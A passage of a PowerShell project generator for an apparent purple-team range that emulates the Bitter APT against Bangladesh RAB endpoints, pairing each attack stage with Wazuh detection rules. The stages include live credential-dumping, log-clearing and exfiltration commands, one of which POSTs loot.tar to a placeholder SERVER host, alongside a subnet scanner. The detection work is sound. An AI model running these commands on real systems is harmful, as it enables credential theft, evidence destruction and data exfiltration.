    objective: 'Understand how ZxxZ evaded detection on BANGLADESHI RAB endpoints using XOR string encryption, security software scanning, and log clearing.',
    real_attacker_behavior: 'ZxxZ uses XOR operations to encrypt strings. Scans for Windows Defender and Kaspersky. Masquerades as Windows Security Update.',
    simulated_behavior: 'Runs REAL XOR string encoding PowerShell script. Creates REAL renamed copy of certutil.exe. Runs REAL wevtutil to clear PowerShell logs.',
    backend_action: 'PowerShell XOR encoding (key 0x42); Copy-Item certutil.exe -> svchost_update.exe; wevtutil cl "Windows PowerShell".',
    sysmon_events: [
      { id: '1', reason: 'ProcessCreate - certutil.exe (renamed), wevtutil.exe.' },
      { id: '11', reason: 'FileCreate - XOR-encoded payload, renamed utility copy.' },
      { id: '23/26', reason: 'FileDelete - original file deleted after encoding.' },
      { id: '2', reason: 'FileCreateTime - timestomping detected.' }
    ],
    windows_event_id: 'PowerShell 4104, Security 1102, Defender 5001/5007',
    windows_event_description: '4104 decoded script; 1102 log cleared; 5001 RTP disabled.',
    wazuh_rule_id: '100405',
    wazuh_description: 'BITTER BANGLADESH: ZxxZ defense evasion on RAB endpoint.',
    wazuh_rule_xml: '<group name="bitter,bangladesh,defense_evasion,">\n  <rule id="100405" level="14">\n    <if_sid>61603</if_sid>\n    <field name="win.eventdata.image">(wevtutil|certutil|esentutl)\\.exe$</field>\n    <description>BITTER (Bangladesh/RAB): Defense evasion via wevtutil/certutil</description>\n    <mitre><id>T1070.003</id><id>T1140</id></mitre>\n  </rule>\n</group>',
    mitre_id: 'T1027, T1070.003, T1070.004, T1036, T1055.012, T1140, T1562.001',
    mitre_name: 'Obfuscated Files or Information / Clear Command History / File Deletion / Masquerading / Process Hollowing / Deobfuscate/Decode / Impair Defenses',
    mitre_tactic: 'Defense Evasion',
    forensic_artifacts: 'PowerShell 4104; Security 1102; Defender 5001/5007; XOR-encoded strings; renamed utility copy.',
    network_indicators: 'C2 resumes after evasion.',
    analyst_notes: 'BANGLADESH CAMPAIGN: XOR string encoding (key 0x42) is a ZxxZ signature found on compromised RAB endpoints.',
    expected_indicators: 'XOR-encoded strings in memory; certutil/esentutl abuse; wevtutil cl.',
    common_false_positives: 'Legit software installers using certutil; IT scripts.',
    response_playbook: 'Re-enable logging; preserve logs; check for XOR-encoded strings.',
    cleanup_notes: 'Removes encoded payload, renamed utility, hollowing marker. Log clearing is NOT recoverable.',
    references: 'Cisco Talos May 2022 (Bangladesh); MITRE S1013 (ZxxZ).'
  },
  {
    key: 'credential_access',
    number: '06',
    name: 'Credential Access',
    short: 'LSASS Dump / SAM / Hives',
    objective: 'Understand how Bitter performed credential access against BANGLADESHI RAB user accounts.',
    real_attacker_behavior: 'Bitter uses Mimikatz variants, procdump64.exe, and secretsdump.py to dump LSASS memory, SAM, LSA Secrets, and NTDS.dit from BANGLADESHI RAB workstations.',
    simulated_behavior: 'Runs REAL comsvcs.dll MiniDump of LSASS. Runs REAL reg save of SAM/SECURITY hives. Creates REAL procdump64.exe auto-download from Microsoft. Runs REAL Impacket secretsdump.py if installed.',
    backend_action: 'rundll32 comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full; reg save HKLM\\SAM sam.hive /y; reg save HKLM\\SECURITY sec.hive /y.',
    sysmon_events: [
      { id: '10', reason: 'ProcessAccess - lsass.exe opened with 0x1fffff rights by rundll32.exe.' },
      { id: '1', reason: 'ProcessCreate - rundll32.exe comsvcs.dll MiniDump; procdump64.exe; reg.exe save.' },
      { id: '11', reason: 'FileCreate - .dmp file, sam.hive or security.hive.' },
      { id: '8', reason: 'CreateRemoteThread - code injected into lsass.exe (rare).' }
    ],
    windows_event_id: 'Security 4656/4663, 4662, 4768/4769, 4624',
    windows_event_description: 'LSASS handle; DCSync 4662; Kerberos 4768/4769; logon 4624.',
    wazuh_rule_id: '100406',
    wazuh_description: 'BITTER BANGLADESH: LSASS access via comsvcs.dll MiniDump on RAB endpoint.',
    wazuh_rule_xml: '<group name="bitter,bangladesh,credential_access,">\n  <rule id="100406" level="15">\n    <if_sid>61609</if_sid>\n    <field name="win.eventdata.targetImage">lsass\\.exe$</field>\n    <field name="win.eventdata.grantedAccess">0x(1010|1410|1438|143a|1fffff)</field>\n    <description>BITTER (Bangladesh/RAB): Suspicious LSASS access</description>\n    <mitre><id>T1003.001</id></mitre>\n  </rule>\n</group>',
    mitre_id: 'T1003.001, T1003.002, T1003.003, T1003.004',
    mitre_name: 'LSASS Memory / SAM / NTDS / LSA Secrets',
    mitre_tactic: 'Credential Access',
    forensic_artifacts: 'REAL lsass.dmp; REAL sam.hive / security.hive; Prefetch; Amcache.',
    network_indicators: 'None (local).',
    analyst_notes: 'BANGLADESH CAMPAIGN: rundll32 comsvcs.dll MiniDump is THE most-detected LSASS technique on compromised RAB endpoints.',
    expected_indicators: 'rundll32.exe accessing lsass with PROCESS_ALL_ACCESS; reg.exe save HKLM\\SAM; sam.hive created.',
    common_false_positives: 'AV/EDR accessing LSASS; backup software reading SAM.',
    response_playbook: 'Identify RAB user account/host; rotate credentials; check lateral movement.',
    cleanup_notes: 'Deletes lsass.dmp, sam.hive, security.hive, and the credential folder.',
    references: 'Cisco Talos May 2022 (Bangladesh); MITRE T1003.001.'
  },
  {
    key: 'lateral_movement',
    number: '07',
    name: 'Lateral Movement (RAB Network)',
    short: 'RDP / WMI / SMB / Staging',
    objective: 'Understand how Bitter moved laterally within the BANGLADESHI RAB network.',
    real_attacker_behavior: 'Bitter uses RDP, WMI, Impacket, PsExec, net use + Robocopy to collect data from BANGLADESHI RAB shares, and staging+archiving.',
    simulated_behavior: 'Runs REAL net use; REAL Test-NetConnection on RDP/WMI/SMB ports; REAL Invoke-WmiMethod to remote targets; REAL PsExec64.exe auto-downloaded from Microsoft; REAL tar.exe staging.',
    backend_action: 'net use \\\\host\\C$; Test-NetConnection -ComputerName host -Port 3389/135/445; Invoke-WmiMethod -Class Win32_Process; PsExec64.exe.',
    sysmon_events: [
      { id: '1', reason: 'ProcessCreate - wmic.exe, psexec64.exe, net.exe, tar.exe.' },
      { id: '3', reason: 'NetworkConnect - RDP 3389, WMI 135, SMB 445 to remote hosts.' },
      { id: '11', reason: 'FileCreate - staged archive (tar/zip) in Recycle Bin or temp.' },
      { id: '22', reason: 'DNS Query - internal RAB network hostnames.' }
    ],
    windows_event_id: 'Security 4624 (Type 3/10), 4648, 4672, 4776',
    windows_event_description: '4624 Type 10 RDP logon; 4648 explicit creds; 4672 special privileges; 4776 NTLM auth.',
    wazuh_rule_id: '100407',
    wazuh_description: 'BITTER BANGLADESH: RDP/WMI lateral movement within RAB network.',
    wazuh_rule_xml: '<group name="bitter,bangladesh,lateral_movement,">\n  <rule id="100407" level="13">\n    <if_sid>61603</if_sid>\n    <field name="win.eventdata.image">(wmic|psexec|psexec64|atexec|secretsdump|robocopy|net|tar)\\.exe$</field>\n    <description>BITTER (Bangladesh/RAB): Lateral movement via WMI/PsExec/Impacket</description>\n    <mitre><id>T1021.001</id><id>T1047</id></mitre>\n  </rule>\n</group>',
    mitre_id: 'T1021.001, T1047, T1039, T1560, T1074.001, T1074.002',
    mitre_name: 'RDP / WMI / Data from Network Shared Drive / Archive Collected Data / Local Data Staging / Remote Data Staging',
    mitre_tactic: 'Lateral Movement, Collection',
    forensic_artifacts: 'Security 4624 Type 10; RDP bitmap cache; WMI OBJECTS.DATA; PsExec service binary; staged archives in Recycle Bin.',
    network_indicators: 'RDP 3389; WMI 135; SMB 445; WinRM 5985/5986 between RAB workstations.',
    analyst_notes: 'BANGLADESH CAMPAIGN: RDP Type 10 logons between RAB workstations from unusual sources are high-fidelity.',
    expected_indicators: 'wmiexec; psexec64.exe; atexec.py; RDP from workstation to workstation within RAB network.',
    common_false_positives: 'Legitimate admin RDP; SCCM remote tools; backup software using SMB.',
    response_playbook: 'Isolate source and target RAB hosts; check RDP logs; review SMB traffic.',
    cleanup_notes: 'Deletes staged archives and lateral-movement log files.',
    references: 'Cisco Talos May 2022 (Bangladesh); MITRE T1021.001/T1047.'
  },
  {
    key: 'exfiltration_c2',
    number: '08',
    name: 'Exfiltration (RAB Data)',
    short: 'HTTP POST / Proxy / DDNS',
    objective: 'Understand how Bitter exfiltrated data stolen from BANGLADESHI RAB networks.',
    real_attacker_behavior: 'Bitter exfiltrates data from BANGLADESHI RAB networks over the C2 channel using HTTP/HTTPS web protocols, external proxies, dynamic DNS, and fast flux.',
    simulated_behavior: 'REAL tar.exe archive of BANGLADESH-lab-staged data. REAL Invoke-WebRequest -Method POST with multipart upload to /api/c2/beacon. Simulated DDNS/fast-flux log entries.',
    backend_action: 'tar -cf loot.tar <staged>; Invoke-WebRequest -Uri http://SERVER:8000/api/c2/beacon -Method POST -InFile loot.tar.',
    sysmon_events: [
      { id: '3', reason: 'NetworkConnect - outbound HTTPS to server on port 8000.' },
      { id: '22', reason: 'DNS Query - dynamic DNS lookups.' },
      { id: '11', reason: 'FileCreate - compressed archive (tar/zip).' },
      { id: '1', reason: 'ProcessCreate - tar.exe, powershell.exe.' }
    ],
    windows_event_id: 'Security 5156, 5158, DNS Client 3008',
    windows_event_description: '5156 WFP connection; 5158 bind; 3008 DNS query logged.',
    wazuh_rule_id: '100408',
    wazuh_description: 'BITTER BANGLADESH: Data exfiltration from RAB network over HTTP/HTTPS C2.',
    wazuh_rule_xml: '<group name="bitter,bangladesh,exfiltration,">\n  <rule id="100408" level="15">\n    <if_sid>61613</if_sid>\n    <field name="win.eventdata.destinationPort">(80|443|8000|8080|8443)</field>\n    <field name="win.eventdata.image">(powershell|tar|7z|rar)\\.exe$</field>\n    <description>BITTER (Bangladesh/RAB): Data exfiltration via web protocols</description>\n    <mitre><id>T1041</id><id>T1071.001</id></mitre>\n  </rule>\n</group>',
    mitre_id: 'T1041, T1071.001, T1090.002, T1568.001, T1560.001',
    mitre_name: 'Exfiltration Over C2 Channel / Web Protocols / External Proxy / Fast Flux DNS / Archive via Utility',
    mitre_tactic: 'Exfiltration, Command and Control',
    forensic_artifacts: 'REAL loot.tar; browser history; DNS cache; proxy logs; TLS SNI; JA3/JA3S.',
    network_indicators: 'HTTPS POST with multipart body to server; large outbound bytes; DDNS queries.',
    analyst_notes: 'BANGLADESH CAMPAIGN: Key detection is outbound HTTPS with large POST bodies from non-browser processes on RAB endpoints.',
    expected_indicators: 'tar.exe creating archives; HTTPS POST; proxy usage; DDNS lookups.',
    common_false_positives: 'Legitimate cloud backup; software updates; sync clients.',
    response_playbook: 'Isolate host; block C2 IPs; preserve proxy logs; report to BGD National CERT.',
    cleanup_notes: 'Deletes loot.tar and exfiltration log files.',
    references: 'Cisco Talos May 2022 (Bangladesh); MITRE T1041/T1071.001.'
  }
];

const STAGE_BY_KEY = {};
for (const s of STAGES) STAGE_BY_KEY[s.key] = s;
const VALID_STAGE_IDS = new Set(Object.keys(STAGE_BY_KEY));

function getStage(stageId) {
  return STAGE_BY_KEY[stageId] || null;
}

module.exports = { STAGES, STAGE_BY_KEY, VALID_STAGE_IDS, getStage };
'@

# ============================================================
# src/services/agent-manager.js
# ============================================================
Write-ProjectFile "src/services/agent-manager.js" @'
'use strict';
const crypto = require('crypto');
const { db, utcnow } = require('../db');

const pending = new Map();
const results = new Map();

function log(msg) { console.log('[bitter-bd/agent_manager] ' + msg); }

function enqueue(workstationId, job) {
  if (!pending.has(workstationId)) pending.set(workstationId, []);
  pending.get(workstationId).push(job);
  log(`enqueue  ws=${JSON.stringify(workstationId)}  job=${job.job_id}  action=${job.action}  stage=${job.stage_id}  queue_len=${pending.get(workstationId).length}`);
}

function dequeue(workstationId) {
  const q = pending.get(workstationId) || [];
  const job = q.length ? q.shift() : null;
  if (job) {
    log(`dequeue  ws=${JSON.stringify(workstationId)}  job=${job.job_id}  action=${job.action}  stage=${job.stage_id}  remaining=${q.length}`);
  }
  return job;
}

function recordResult(jobId, result) {
  results.set(jobId, result);
  if (results.size > 5000) {
    let i = 0;
    for (const k of results.keys()) {
      if (i++ >= 1000) break;
      results.delete(k);
    }
  }
  log(`result   job=${jobId}  status=${result.status}  success=${result.success}`);
}

function getResult(jobId) { return results.get(jobId) || null; }
function pendingCount(workstationId) { return (pending.get(workstationId) || []).length; }

function canonicalId(payload) {
  const wid = String(payload.workstation_id || '').trim();
  if (wid) return wid;
  const hn = String(payload.hostname || '').trim();
  if (hn) return hn;
  return 'unknown';
}

function allowedIds() {
  const raw = String(process.env.ALLOWED_WORKSTATION_IDS || '').trim();
  if (!raw) return null;
  return raw.split(',').map(x => x.trim()).filter(x => x);
}

function registerOrUpdate(payload) {
  const wid = canonicalId(payload);
  const ip = String(payload.ip || '').trim();
  const now = utcnow();

  if (ip) {
    const placeholders = db.prepare(
      'SELECT id FROM workstations WHERE ip = ? AND manual = 1 AND id != ?'
    ).all(ip, wid);
    for (const ph of placeholders) {
      log(`removing manual placeholder  id=${JSON.stringify(ph.id)}  ip=${JSON.stringify(ip)}`);
      db.prepare('DELETE FROM workstations WHERE id = ?').run(ph.id);
    }
  }

  const existing = db.prepare('SELECT * FROM workstations WHERE id = ?').get(wid);

  if (!existing) {
    const allowedList = allowedIds();
    const allowed = !allowedList || allowedList.includes(wid);
    db.prepare(`
      INSERT INTO workstations
        (id, hostname, ip, os, agent_token, status, wazuh_status, sysmon_status,
         current_user, current_stage, allowed, manual, created_at, last_seen)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      wid, payload.hostname || wid, ip, payload.os || '',
      crypto.randomBytes(24).toString('base64url'), 'ONLINE',
      payload.wazuh_status || 'UNKNOWN', payload.sysmon_status || 'UNKNOWN',
      payload.current_user || '', payload.current_stage || '',
      allowed ? 1 : 0, 0, now, now
    );
    log(`register NEW  ws=${JSON.stringify(wid)}`);
  } else {
    log(`register UPDATE  ws=${JSON.stringify(wid)}`);
    const newStatus = (existing.status === 'OFFLINE' || existing.status === 'DISCONNECTED' || existing.status === 'UNKNOWN' || existing.status === '')
      ? 'ONLINE' : existing.status;
    db.prepare(`
      UPDATE workstations SET hostname = ?, ip = ?, os = ?, status = ?,
        wazuh_status = COALESCE(?, wazuh_status), sysmon_status = COALESCE(?, sysmon_status),
        current_user = COALESCE(?, current_user), current_stage = COALESCE(?, current_stage), last_seen = ?
      WHERE id = ?
    `).run(
      payload.hostname || existing.hostname || wid, ip || existing.ip || '', payload.os || existing.os || '',
      newStatus, payload.wazuh_status || null, payload.sysmon_status || null,
      payload.current_user || null,
      payload.current_stage !== undefined && payload.current_stage !== null ? payload.current_stage : null,
      now, wid
    );
  }
  return db.prepare('SELECT * FROM workstations WHERE id = ?').get(wid);
}

function newJob(workstationId, stageId, action) {
  action = action || 'RUN';
  const now = new Date();
  const timeoutMs = parseInt(process.env.SIMULATION_TIMEOUT || '300', 10) * 1000;
  return {
    job_id: crypto.randomBytes(16).toString('base64url'),
    workstation_id: workstationId, stage_id: stageId, action: action,
    issued_at: now.toISOString(),
    expires_at: new Date(now.getTime() + timeoutMs).toISOString()
  };
}

function logActivity(user, workstation, action, stage, result) {
  db.prepare(`
    INSERT INTO activity_logs (timestamp, user, workstation_id, action, stage, result)
    VALUES (?, ?, ?, ?, ?, ?)
  `).run(utcnow(), user || '', workstation || '', action || '', stage || '', result || '');
}

module.exports = {
  enqueue, dequeue, recordResult, getResult, pendingCount,
  registerOrUpdate, newJob, logActivity, canonicalId
};
'@

# ============================================================
# src/services/discovery.js  *** UPDATED ***
# ============================================================
Write-ProjectFile "src/services/discovery.js" @'
'use strict';
/*
 * Network discovery for the Bitter BD range.
 *
 * Scans EVERY IPv4 interface of this machine in parallel, using three
 * independent host-detection methods so Windows hosts that block inbound
 * ICMP are still found:
 *
 *   1. ICMP echo (ping)
 *   2. TCP connect() probe on common service ports
 *      (445/139/135/3389/22/80/443/5985/8080/8000)
 *   3. OS ARP cache lookup (arp -a on Windows, ip neigh on Linux)
 *
 * Exports:
 *   - listInterfaces()  : every IPv4 interface on this machine (with metadata)
 *   - localSubnets()    : scannable subnets from those interfaces
 *   - scanAll(subnets)  : scan a list of subnets in parallel, return deduped hosts
 *   - scanSubnet(sub)   : scan one subnet
 *   - expandSubnet(sub) : helper
 *   - localSubnet()     : legacy single-subnet helper
 */
const { execFile } = require('child_process');
const { promisify } = require('util');
const dns = require('dns').promises;
const net = require('net');
const os = require('os');
const execFileAsync = promisify(execFile);

function ipToInt(ip) {
  return ip.split('.').reduce((acc, o) => (acc << 8) + parseInt(o, 10), 0) >>> 0;
}
function intToIp(n) {
  return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');
}
function expandSubnet(subnet) {
  const parts = String(subnet).split('/');
  const base = parts[0];
  const prefix = parts[1] !== undefined ? parseInt(parts[1], 10) : 24;
  if (isNaN(prefix) || prefix < 8 || prefix > 30) throw new Error(`Invalid subnet '${subnet}': unsupported prefix /${prefix}`);
  const octets = base.split('.').map(x => parseInt(x, 10));
  if (octets.length !== 4 || octets.some(x => isNaN(x) || x < 0 || x > 255)) throw new Error(`Invalid subnet '${subnet}'`);
  const baseInt = ipToInt(base);
  const mask = prefix === 0 ? 0 : (0xFFFFFFFF << (32 - prefix)) >>> 0;
  const networkInt = (baseInt & mask) >>> 0;
  const broadcastInt = (networkInt | (~mask >>> 0)) >>> 0;
  const hosts = [];
  for (let i = networkInt + 1; i < broadcastInt; i++) hosts.push(intToIp(i));
  return hosts;
}

/* ---------------- 1. ICMP ping ---------------- */
async function pingHost(ip, timeoutSec = 1.0) {
  const isWin = process.platform === 'win32';
  const args = isWin
    ? ['-n', '1', '-w', String(Math.round(timeoutSec * 1000)), ip]
    : ['-c', '1', '-W', String(Math.max(1, Math.round(timeoutSec))), ip];
  try {
    await execFileAsync('ping', args, { timeout: Math.round((timeoutSec + 1.5) * 1000) });
    return true;
  } catch (e) {
    return false;
  }
}

/* ---------------- 2. TCP probe ---------------- */
function tcpProbe(ip, port, timeoutMs) {
  timeoutMs = timeoutMs || 600;
  return new Promise((resolve) => {
    const sock = new net.Socket();
    let done = false;
    const finish = (ok) => {
      if (done) return;
      done = true;
      try { sock.destroy(); } catch (e) {}
      resolve(ok);
    };
    sock.setTimeout(timeoutMs);
    sock.once('connect', () => finish(true));
    sock.once('timeout', () => finish(false));
    sock.once('error', () => finish(false));
    try { sock.connect(port, ip); } catch (e) { finish(false); }
  });
}

const PROBE_PORTS = [445, 139, 135, 3389, 22, 80, 443, 5985, 8080, 8000];

async function tcpProbeHost(ip) {
  const results = await Promise.all(PROBE_PORTS.map(p => tcpProbe(ip, p, 600)));
  return results.some(x => x);
}

/* ---------------- 3. ARP cache ---------------- */
async function arpCache() {
  try {
    if (process.platform === 'win32') {
      const { stdout } = await execFileAsync('arp', ['-a'], { timeout: 5000 });
      const out = [];
      const re = /(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F-]{17})\s+(\S+)/g;
      let m;
      while ((m = re.exec(stdout)) !== null) {
        const ip = m[1];
        const mac = m[2].toLowerCase();
        if (mac === 'ff-ff-ff-ff-ff-ff') continue;
        if (mac === '00-00-00-00-00-00') continue;
        if (ip.endsWith('.255')) continue;
        if (ip.startsWith('224.') || ip.startsWith('239.')) continue;
        if (ip.startsWith('127.')) continue;
        out.push({ ip, mac, type: m[3] });
      }
      return out;
    } else {
      const { stdout } = await execFileAsync('ip', ['neigh'], { timeout: 5000 });
      const out = [];
      for (const line of stdout.split('\n')) {
        const m = line.match(/^(\d+\.\d+\.\d+\.\d+)\s+dev\s+\S+\s+(?:lladdr\s+([0-9a-f:]{17}))?\s*(\S+)?/);
        if (m && m[1] && !m[1].startsWith('127.')) {
          const mac = (m[2] || '').toLowerCase();
          if (!mac || mac === '00:00:00:00:00:00' || mac === 'ff:ff:ff:ff:ff:ff') continue;
          out.push({ ip: m[1], mac, type: m[3] || '' });
        }
      }
      return out;
    }
  } catch (e) { return []; }
}

async function getHostname(ip) {
  try {
    const res = await Promise.race([dns.reverse(ip), new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 1500))]);
    return (res && res[0]) || '';
  } catch (e) { return ''; }
}

async function probeHost(ip) {
  if (await pingHost(ip, 1.0)) return { alive: true, via: 'icmp' };
  if (await tcpProbeHost(ip))   return { alive: true, via: 'tcp' };
  return { alive: false, via: null };
}

/* -------------------------------------------------------------------------
 * Every IPv4 interface on this machine (including loopback, APIPA, virtual).
 * ------------------------------------------------------------------------- */
function listInterfaces() {
  const out = [];
  try {
    const ifaces = os.networkInterfaces();
    for (const name of Object.keys(ifaces)) {
      for (const iface of ifaces[name]) {
        if (iface.family === 'IPv4') {
          out.push({
            name,
            address: iface.address,
            netmask: iface.netmask,
            internal: !!iface.internal,
            mac: iface.mac || ''
          });
        }
      }
    }
  } catch (e) {}
  return out;
}

/* Scannable subnets: skip loopback (127.x), APIPA (169.254.x) and internal. */
function localSubnets() {
  const out = [];
  for (const i of listInterfaces()) {
    if (i.internal) continue;
    if (i.address.startsWith('127.')) continue;
    if (i.address.startsWith('169.254.')) continue;
    const parts = i.address.split('.');
    out.push({
      iface: i.name,
      address: i.address,
      netmask: i.netmask,
      subnet: `${parts[0]}.${parts[1]}.${parts[2]}.0/24`
    });
  }
  return out;
}

function localSubnet() {
  const all = localSubnets();
  const preferred = all.find(x => !/virtual|vmware|vbox|hyper-v|loopback|docker|tunnel|tap|teredo/i.test(x.iface)) || all[0];
  return preferred ? preferred.subnet : '';
}

/* -------------------------------------------------------------------------
 * Scan ONE subnet. Returns hosts found within it.
 * ------------------------------------------------------------------------- */
async function scanSubnet(subnet, maxHosts = 1024, concurrency = 128) {
  const hosts = expandSubnet(subnet).slice(0, maxHosts);
  const queue = hosts.slice();
  const results = [];
  const selfSet = new Set(localSubnets().map(l => l.address));

  async function worker() {
    while (queue.length) {
      const ip = queue.shift();
      if (!ip) break;
      const r = await probeHost(ip);
      if (r.alive) {
        const hn = await getHostname(ip);
        results.push({
          ip, hostname: hn, reachable: true, via: r.via,
          subnet, is_self: selfSet.has(ip)
        });
      }
    }
  }
  const workers = [];
  for (let i = 0; i < concurrency; i++) workers.push(worker());
  await Promise.all(workers);

  // Merge in ARP-cache entries inside this subnet that probing missed.
  const arp = await arpCache();
  const have = new Set(results.map(r => r.ip));
  const hostSet = new Set(hosts);
  for (const a of arp) {
    if (have.has(a.ip)) continue;
    if (!hostSet.has(a.ip)) continue;
    const hn = await getHostname(a.ip);
    results.push({
      ip: a.ip, hostname: hn, reachable: true, via: 'arp',
      subnet, mac: a.mac, is_self: selfSet.has(a.ip)
    });
    have.add(a.ip);
  }

  results.sort((a, b) => ipToInt(a.ip) - ipToInt(b.ip));
  return results;
}

/* -------------------------------------------------------------------------
 * Scan MULTIPLE subnets in parallel (one shared worker pool over ALL hosts).
 * ------------------------------------------------------------------------- */
async function scanAll(subnets, concurrency = 192) {
  const selfSet = new Set(localSubnets().map(l => l.address));

  // Build one big queue: [{ip, subnet}, ...]
  const queue = [];
  const subnetHostSets = {};
  for (const s of subnets) {
    let hosts;
    try { hosts = expandSubnet(s); } catch (e) { continue; }
    subnetHostSets[s] = new Set(hosts);
    for (const ip of hosts) queue.push({ ip, subnet: s });
  }

  const results = [];
  const seenIps = new Set();

  async function worker() {
    while (queue.length) {
      const item = queue.shift();
      if (!item) break;
      if (seenIps.has(item.ip)) continue;
      const r = await probeHost(item.ip);
      if (r.alive) {
        if (seenIps.has(item.ip)) continue;
        seenIps.add(item.ip);
        const hn = await getHostname(item.ip);
        results.push({
          ip: item.ip, hostname: hn, reachable: true, via: r.via,
          subnet: item.subnet, is_self: selfSet.has(item.ip)
        });
      }
    }
  }

  const workers = [];
  for (let i = 0; i < concurrency; i++) workers.push(worker());
  await Promise.all(workers);

  // Merge ARP-cache entries
  const arp = await arpCache();
  for (const a of arp) {
    if (seenIps.has(a.ip)) continue;
    // which subnet does this ARP entry belong to?
    let matchedSubnet = null;
    for (const s of subnets) {
      if (subnetHostSets[s] && subnetHostSets[s].has(a.ip)) { matchedSubnet = s; break; }
    }
    if (!matchedSubnet) continue;
    seenIps.add(a.ip);
    const hn = await getHostname(a.ip);
    results.push({
      ip: a.ip, hostname: hn, reachable: true, via: 'arp',
      subnet: matchedSubnet, mac: a.mac, is_self: selfSet.has(a.ip)
    });
  }

  results.sort((a, b) => ipToInt(a.ip) - ipToInt(b.ip));
  return results;
}

module.exports = {
  scanSubnet, scanAll,
  localSubnet, localSubnets, listInterfaces,
  expandSubnet, pingHost
};
'@

# ============================================================
# src/services/wazuh-api.js
# ============================================================
Write-ProjectFile "src/services/wazuh-api.js" @'
'use strict';
const axios = require('axios');
const https = require('https');

function mkClient() {
  const verify = String(process.env.VERIFY_TLS || '').toLowerCase() === 'true';
  return axios.create({ timeout: 15000, httpsAgent: new https.Agent({ rejectUnauthorized: verify }) });
}

class WazuhAPI {
  constructor() {
    this.base = String(process.env.WAZUH_API_URL || '').replace(/\/+$/, '');
    this.user = process.env.WAZUH_API_USERNAME || '';
    this.password = process.env.WAZUH_API_PASSWORD || '';
    this._token = null;
  }
  configured() { return Boolean(this.base && this.user && this.password); }
  async _auth(client) {
    if (this._token) return this._token;
    try {
      const r = await client.post(`${this.base}/security/user/authenticate`, null, { auth: { username: this.user, password: this.password }, timeout: 10000 });
      this._token = (r.data && r.data.data && r.data.data.token) || null;
      return this._token;
    } catch (e) { return null; }
  }
  async status() {
    if (!this.configured()) return { configured: false, reachable: false, error: 'Wazuh API not configured' };
    const client = mkClient();
    const token = await this._auth(client);
    if (!token) return { configured: true, reachable: false, error: 'Wazuh authentication failed' };
    const h = { headers: { Authorization: `Bearer ${token}` } };
    try {
      const info = (await client.get(`${this.base}/manager/info`, h)).data;
      const agents = (await client.get(`${this.base}/agents?limit=1`, h)).data;
      return { configured: true, reachable: true, version: info && info.data && info.data.version, agents_total: agents && agents.data && agents.data.total_affected_items };
    } catch (e) { return { configured: true, reachable: false, error: String(e.message || e) }; }
  }
  async agents() {
    if (!this.configured()) return [];
    const client = mkClient();
    const token = await this._auth(client);
    if (!token) return [];
    try {
      const r = await client.get(`${this.base}/agents?limit=500`, { headers: { Authorization: `Bearer ${token}` } });
      return (r.data && r.data.data && r.data.data.affected_items) || [];
    } catch (e) { return []; }
  }
  async rules(search, limit) {
    search = search || ''; limit = limit || 200;
    if (!this.configured()) return [];
    const client = mkClient();
    const token = await this._auth(client);
    if (!token) return [];
    try {
      const params = { limit };
      if (search) params.search = search;
      const r = await client.get(`${this.base}/rules`, { headers: { Authorization: `Bearer ${token}` }, params });
      return (r.data && r.data.data && r.data.data.affected_items) || [];
    } catch (e) { return []; }
  }
  async ruleExists(ruleId) {
    const rules = await this.rules(String(ruleId), 50);
    for (const r of rules) { if (String(r.id) === String(ruleId)) return r; }
    return null;
  }
  async logtest(log) {
    if (!this.configured()) return { ok: false, error: 'Wazuh API not configured' };
    const client = mkClient();
    const token = await this._auth(client);
    if (!token) return { ok: false, error: 'Wazuh authentication failed' };
    try {
      const r = await client.put(`${this.base}/logtest`, { log_format: 'syslog', location: 'logtest', event: log }, { headers: { Authorization: `Bearer ${token}` } });
      return { ok: true, data: r.data };
    } catch (e) { return { ok: false, error: String(e.message || e) }; }
  }
}
module.exports = { WazuhAPI };
'@

# ============================================================
# src/services/indexer.js
# ============================================================
Write-ProjectFile "src/services/indexer.js" @'
'use strict';
const axios = require('axios');
const https = require('https');

function mkClient() {
  const verify = String(process.env.VERIFY_TLS || '').toLowerCase() === 'true';
  const user = process.env.WAZUH_INDEXER_USERNAME || '';
  const pass = process.env.WAZUH_INDEXER_PASSWORD || '';
  return axios.create({ timeout: 15000, auth: { username: user, password: pass }, httpsAgent: new https.Agent({ rejectUnauthorized: verify }) });
}

class WazuhIndexer {
  constructor() {
    this.base = String(process.env.WAZUH_INDEXER_URL || '').replace(/\/+$/, '');
    this.user = process.env.WAZUH_INDEXER_USERNAME || '';
    this.password = process.env.WAZUH_INDEXER_PASSWORD || '';
  }
  configured() { return Boolean(this.base && this.user && this.password); }
  async status() {
    if (!this.configured()) return { configured: false, reachable: false };
    try {
      const c = mkClient();
      const r = await c.get(`${this.base}/_cluster/health`, { timeout: 8000 });
      return { configured: true, reachable: r.status === 200, health: r.data };
    } catch (e) { return { configured: true, reachable: false, error: String(e.message || e) }; }
  }
  async searchAlerts(query, size, sortDesc) {
    size = size || 50; if (sortDesc === undefined) sortDesc = true;
    if (!this.configured()) return { hits: { hits: [], total: { value: 0 } } };
    const body = { size, sort: [{ '@timestamp': { order: sortDesc ? 'desc' : 'asc' } }], query };
    try {
      const c = mkClient();
      const r = await c.post(`${this.base}/wazuh-alerts-*/_search`, body, { timeout: 15000 });
      return r.data;
    } catch (e) { return { error: String(e.message || e), hits: { hits: [], total: { value: 0 } } }; }
  }
  async recentAlerts(minutes = 15, size = 50) {
    const q = { range: { '@timestamp': { gte: `now-${minutes}m`, lte: 'now' } } };
    return this.searchAlerts(q, size);
  }
  async hunt(filters, size = 50) {
    const must = [];
    for (const [field, value] of Object.entries(filters || {})) {
      if (value === null || value === undefined || value === '') continue;
      if (field === 'level_min') { must.push({ range: { 'rule.level': { gte: parseInt(value, 10) } } }); }
      else if (field === 'time_range') { must.push({ range: { '@timestamp': { gte: `now-${value}m` } } }); }
      else if (field === 'q') { must.push({ query_string: { query: value, default_field: '*' } }); }
      else { must.push({ match: { [field]: value } }); }
    }
    const query = must.length ? { bool: { must } } : { match_all: {} };
    return this.searchAlerts(query, size);
  }
}
module.exports = { WazuhIndexer };
'@

# ============================================================
# src/services/correlation.js
# ============================================================
Write-ProjectFile "src/services/correlation.js" @'
'use strict';
const { WazuhIndexer } = require('./indexer');

async function relatedEvents(alert, size = 25) {
  const src = alert._source || {};
  const rule = src.rule || {};
  const agent = src.agent || {};
